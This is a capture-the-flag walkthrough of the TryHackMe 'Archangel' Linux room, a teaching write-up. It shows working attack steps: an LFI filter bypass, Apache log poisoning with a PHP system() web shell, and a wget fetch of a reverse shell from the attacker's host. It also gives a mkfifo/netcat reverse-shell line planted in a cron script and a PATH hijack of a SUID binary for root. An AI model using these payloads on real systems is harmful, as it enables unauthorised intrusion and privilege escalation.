---
title: TryHackMe | Archangel Writeup 
date: 2026-05-02 
categories: [TryHackMe]
tags: ["local file inclusion", poison, "cron jobs", suid, "path hijacking"]     # TAG names should always be lowercase
image:
  path: assets/img/archangel/archangel_thm_logo.jpeg
  width: 100
  height: 100
description: A beginner-friendly room focusing on web exploitation via Local File Inclusion and gaining root access through insecurely configured cron jobs and path hijacking.
---

## 1. Room Info
**Name:** Archangel \\
**Platform:** TryHackMe \\
**Difficulty:** Easy \\
**OS:** Linux \\
**Link:** [Archangel room on TryHackMe](https://tryhackme.com/room/archangel)

## 2. Reconnaissance
I started with a standard service scan to identify open ports.

```terminal
kali@kali:~/thm$ nmap -sV -sC 10.128.185.88 -oN nmap/initial.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 05:24 -0400
Nmap scan report for 10.128.185.88
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
SSH is listening on port 22 and an Apache server is running on port 80. 

Room's description on TryHackMe mentions **Web Exploitation** and **Local File Inclusion**. 
## 3. Enumeration
I quickly skimmed the webpage and its source code but haven't found anything useful (that's not the case on this machine as I would realize later), so I started a directory scan with `gobuster` using `dirb/common.txt`. 
```bash
gobuster dir -u http://<Target-IP> -w /ush/share/wordlists/dirb/common.txt
```
Accessible (status `200` or `301`) were the following entries:
```
flags               (Status: 301) [Size: 314] [--> http://10.128.185.88/flags/]
images              (Status: 301) [Size: 315] [--> http://10.128.185.88/images/]
index.html          (Status: 200) [Size: 19188]
layout              (Status: 301) [Size: 315] [--> http://10.128.185.88/layout/]
pages               (Status: 301) [Size: 314] [--> http://10.128.185.88/pages/]
```
First, I quickly checked `flags/`, but it turned out to contain only an HTML RickRoll redirect.
![Getting RickRolled](assets\img\archangel\1-flags_html_redirect.png)

`pages/` and `layout/` also did not contain anything useful. At this point I decided to go back to the home page  and scan it again for any clues. And here it is - a hostname, at the very top of the page.
![A hostname](assets\img\archangel\2-hostname.png)

If I wouldn't have found anything on the home page I would consider using a bigger list such as `dirbuster/directory-list-2.3-medium.txt` or searching for files with extensions like `php`,`html` or `bak`. Luckily, this wasn't necessary.


**Virtual Hosting** allows a single server to host multiple websites on a single IP address. When a client sends an **HTTP request**, the server uses the **Host header** to determine which specific website to serve. To access the website with the hostname `mafialive.thm` add the following line to `/etc/hosts`:

```text
<Target-IP> mafialive.thm
```

After accessing `http://mafialive.thm` I got the first flag.
![flag-1](assets/img/archangel/3-flag_1.png)

So I ran `gobuster` on the new webpage and these are the accessible recources:
```
index.html          (Status: 200) [Size: 59]
robots.txt          (Status: 200) [Size: 34]
```

`robots.txt` prevents search engine bots from indexing sensitive or irrelevant portions of the website. Looking at the file itself I saw that there exits `/test.php` page.

![robots](assets/img/archangel/4-robots.png)

After navigating to `http://mafialive.thm/test.php` and clicking the button I saw two things. First, the message `Control is an illusion` which might be a hint towards improper input validation logic, and, second, that the system dynamically loads content via `?view=`. 

![button](assets/img/archangel/5-button.png)

Let's see what's under the hood. To view the source code of `/test.php` I needed to convert the contents of the file to `base64` for farther decoding before the system evaluates `php` code and sends back the page that is normally displayed. Utilizing `convert.base64-encode` filter I got `base64` representation of the file.

> From [Official PHP Manual](https://www.php.net/manual/en/wrappers.php.php#:~:text=available%20on%20Windows.-,php%3A//filter,-%C2%B6) - php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening.

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
![base64](assets/img/archangel/6-base64.png)

## 4. Vulnerability Analysis
So I passed `base64` string (second part) of the source code into `base64 -d` and got the second flag:
```terminal
kali@kali:~/thm/archangel$ echo "cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
php

            //FLAG: thm{flag would be here}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>

```
Notice, there is an `include $_GET['view']` statement. In `php`, `include` is used to import and **paste** the contents of a file in the place where `include` was called. It might be useful when a developer wants to reuse a piece of text/code across multiple pages. The imported file is then not just treated as plaintext but is **evaluated**. In practical terms it means that if an attacker manages to write a malicious piece of `php` code inside a file that is being subject to `include`, that code would be executed and the system will be compromised.

One way to insert a malicious code while not having any direct write access is **Log Poisoning**. Apache records access logs in `/var/log/apache2/access.log`. Looking back at the source code of `/test.php` I saw that input filtering in `view` key is done by black-listing `../..` path traversal and rejecting anything that does not contain `/var/www/html/development_testing`. The combination of these two things made it possible for me to access the log file via the following inclusion:
```
view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```
![access log](assets/img/archangel/7-access_log.png)
Since `User-Agent` is logged and it is easily modifiable in `HTTP GET` request, I had everything I needed to get access to the server.
## 5. Exploitation
I used Burp Suite to intercept the request and modify `User-Agent` header with the following sciript:
```php
<?php system($_GET['cmd']); ?>
```
![modified user-agent header](assets/img/archangel/8-burp.png)
At this point the `php` code from above is logged as the `User-Agent` field in `access.log`. When the `include` function calls the log file, the engine parses the `<?php ... ?>` tags and executes the command passed to the `cmd` parameter.
![cmd key](assets/img/archangel/9-cmdworking.png)

Time to get a reverse shell. I started a Python web server using the following command to host my `shell.php`:
```bash
python3 -m http.server 80
```
If you are on Kali, the shell that I used is located at `/usr/share/webshells/php/php-reverse-shell.php`. Don't forget to set your IP and port (I picked `8888`) at the beginning of the file. I also set up a netcat listener via:
```bash
nc -lvnp 8888
``` 
One of possible ways to upload the reverse shell to the server is by using `wget`. The url would be looking as follows:
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=wget+http://<Your IP>/shell.php+-O+/tmp/shell.php
```

Well, normally, `www-data` user that is being used in Apache servers to retrieve data does not have any write permissions in the web server directory. That's why I placed the reverse shell in globally-writable `/tmp` folder.
The only thing left was to execute the reverse shell script by passing `cmd=php+/tmp/shell.php`.
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=php+/tmp/shell.php
```
![got the reverse shell](assets/img/archangel/10-userflagaftershell.png)

## 6. Privilege Escalation
First, I ran `sudo -l` to see what `sudo` commands were allowed for `www-data` user but I got promted for a password which I did not have. Next thing I checked system-wide cron jobs. Cron jobs are commands that are set to be executed periodically (e.g., weekly, monthly). There was a cron job assigned to user `archangel` to execute `/opt/helloworld.sh`.
```bash
cat /etc/crontab
```
![cron jobs](assets/img/archangel/11-crontab.png)

Luckily, `www-user` has write permissions on `/opt/helloworld.sh` so If I put a reverse shell script in that file, I will have access to the `archangel`'s shell. Before that, I started a second netcat listener on port `7777`:
```bash
nc -lvnp 7777
``` 
Paste the following command at the end of `/opt/helloworld.sh`. Don't forget to set your IP address.
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your IP> 7777 > /tmp/f
```
I waited a bit and got the second user flag:
![user flag 2](assets/img/archangel/12-user2flag.png)

One of the things it's a good habit to check is `SUID` (Set User ID) executables. These are special files that, when run, are executed with the permissions of the file owner rather than the user who executed them. Since the goal is to get the `root` shell, I specifically looked for those owned by `root`. I ran the following command to search for binaries with the `SUID` bit set:
```bash
find / -perm -u=s -type f 2>/dev/null
```
> `find /` starts search from the root directory \\
`-perm` tells to use filtering based on permissions \\
`-u=s` looks for the `SUID` bit set \\
`-type f` looks only for files \\
`2>/dev/null` ignore "Permission denied" errors

In the output that I provide below I was looking for files that are not standard linux executables. Usually, these custom binaries are stored outside the system standard paths such as `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, `/usr/lib` and `/lib` (including variants like `/lib64`).
```
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/home/archangel/secret/backup
```
The one that just screams "LOOK AT ME" is `/home/archangel/secret/backup`. After manually confirming it's owned by `root`, I began my inspection with `strace`.
>From [GeeksForGeeks - Strace command in Linux with Examples](https://www.geeksforgeeks.org/linux-unix/strace-command-in-linux-with-examples/) - strace is a diagnostic, debugging and instructional userspace utility for Linux. It is used to monitor and tamper with interactions between processes and the Linux kernel, which include system calls, signal deliveries, and changes of process state.

To put it simply, `strace` allowed me to observe exactly how `/home/archangel/secret/backup` interacts with the filesystem, executes commands, and handles errors in real time.
``` bash
strace /home/archangel/secret/backup 2>&1 | grep -iE "open|access|no such file"
``` 
> `2>&1` redirect to `stdout` instead of default `stderr` \\
`grep -iE` case insensitive and enable Extended Regex that allows for "OR" ("|")  

```
wait4(1153, cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```
The line above is the very last line of the output. It indicates that `/home/archangel/secret/backup` tried to copy a non-existing file. The most important thing and the one that enables the last step of privilage escalation is the fact that the command used `cp`, and not its absolote path variant. This means that the system will look into directories defined in `PATH` variable starting from the beginning to locate the executable named `cp`. On a side note, `strings` and  `ltrace` would also reveal the above-described vulnerability.

To exploit this, I created a fake `cp` executable in `/tmp` and put `/tmp` as the first directory in system `PATH`:
```bash
export PATH=/tmp:$PATH           
echo "/bin/bash -p" > /tmp/cp
chmod +x /tmp/cp
/home/archangel/secret/backup
```
> `/bin/bash -p` preserve privileges after opening a shell of the executing user

Since `/home/archangel/secret/backup` executes with `root` privileges, `root` shell opened.
![root flag](assets/img/archangel/13-rootflag.png).
